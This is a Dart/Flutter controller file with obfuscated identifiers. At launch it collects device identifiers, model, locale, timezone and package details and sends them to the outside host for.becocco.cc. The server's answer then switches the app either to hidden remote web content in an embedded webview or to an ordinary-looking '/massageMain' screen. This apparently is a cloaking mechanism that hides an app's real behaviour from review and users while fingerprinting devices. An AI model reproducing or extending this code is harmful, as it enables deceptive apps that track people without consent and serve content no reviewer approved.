import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/reload");
  }
}

class PageLogic extends GetxController {

  var ztinfm = RxBool(false);
  var vrugcwfolz = RxBool(true);
  var bliz = RxString("");
  var otis = RxBool(false);
  var quitzon = RxBool(true);
  final lvfkbomzh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkConnect();
    super.onInit();
    rqoym();
  }


  Future<void> rqoym() async {

    otis.value = true;
    quitzon.value = true;
    vrugcwfolz.value = false;

    lvfkbomzh.post("https://for.becocco.cc/iscnhgbjztmkar",data: await aztuci()).then((value) {
      var kfsnve = value.data["kfsnve"] as String;
      var icywjf = value.data["icywjf"] as bool;
      if (icywjf) {
        bliz.value = kfsnve;
        henry();
      } else {
        jakubowski();
      }
    }).catchError((e) {
      vrugcwfolz.value = true;
      quitzon.value = true;
      otis.value = false;
    });
  }

  Future<Map<String, dynamic>> aztuci() async {
    final DeviceInfoPlugin cxbykg = DeviceInfoPlugin();
    PackageInfo rfsz_edgf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var uhxcpm = Platform.localeName;
    var gbxmuwh = currentTimeZone;

    var hlnfau = rfsz_edgf.packageName;
    var xyrgm = rfsz_edgf.version;
    var kzbeirla = rfsz_edgf.buildNumber;

    var jbceawh = rfsz_edgf.appName;
    var gyvoz = "";
    var mzfnlid  = "";
    var wgqernsm = "";
    var connorWiza = "";
    var vanceSanford = "";
    var annaliseBeahan = "";
    var eliHane = "";
    var heavenMarvin = "";


    var kawtnyrl = "";
    var jvcyw = false;

    if (GetPlatform.isAndroid) {
      kawtnyrl = "android";
      var mpfixoh = await cxbykg.androidInfo;

      wgqernsm = mpfixoh.brand;

      gyvoz  = mpfixoh.model;
      mzfnlid = mpfixoh.id;

      jvcyw = mpfixoh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      kawtnyrl = "ios";
      var qxwzsbdj = await cxbykg.iosInfo;
      wgqernsm = qxwzsbdj.name;
      gyvoz = qxwzsbdj.model;

      mzfnlid = qxwzsbdj.identifierForVendor ?? "";
      jvcyw  = qxwzsbdj.isPhysicalDevice;
    }
    var res = {
      "jbceawh": jbceawh,
      "kzbeirla": kzbeirla,
      "xyrgm": xyrgm,
      "gyvoz": gyvoz,
      "connorWiza" : connorWiza,
      "gbxmuwh": gbxmuwh,
      "mzfnlid": mzfnlid,
      "heavenMarvin" : heavenMarvin,
      "uhxcpm": uhxcpm,
      "kawtnyrl": kawtnyrl,
      "jvcyw": jvcyw,
      "vanceSanford" : vanceSanford,
      "hlnfau": hlnfau,
      "annaliseBeahan" : annaliseBeahan,
      "wgqernsm": wgqernsm,
      "eliHane" : eliHane,

    };
    return res;
  }

  Future<void> jakubowski() async {
    Get.offAllNamed("/massageMain");
  }

  Future<void> henry() async {
    Get.offAllNamed("/init");
  }

}
